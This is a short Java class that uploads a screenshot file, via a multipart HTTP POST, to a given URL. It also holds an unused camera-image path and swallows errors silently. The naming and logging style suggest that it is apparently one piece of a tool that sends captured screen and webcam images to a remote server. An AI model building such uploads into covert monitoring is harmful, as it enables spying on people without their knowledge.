import java.io.File;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

public class PostCreator {
	private String url;
	private String screen_img;
	private String camera_img;

	public PostCreator(String url, String screen_img, String camera_img) {
		System.out.println("[*] Loading variables");
		this.url = url;
		this.screen_img = screen_img;
		this.camera_img = camera_img;
	}

	public void send() {
		System.out.println("[*] Preparing request");
		CloseableHttpClient http_client = HttpClients.createDefault();
		try {
			HttpPost http_post = new HttpPost(this.url);
			FileBody screen_file = new FileBody(new File(this.screen_img));
			HttpEntity request_entity = MultipartEntityBuilder.create().addPart("screen_img", screen_file).build();
			http_post.setEntity(request_entity);
			CloseableHttpResponse response = http_client.execute(http_post);
			try {
				HttpEntity response_entity = response.getEntity();
				EntityUtils.consume(response_entity);
			} catch (Exception e1) {} finally {
				response.close();
			}
		} catch (Exception e2) {} finally {
			try { http_client.close(); } catch (Exception e3) {}
		}

		System.out.println("[+] Request sent");
	}
}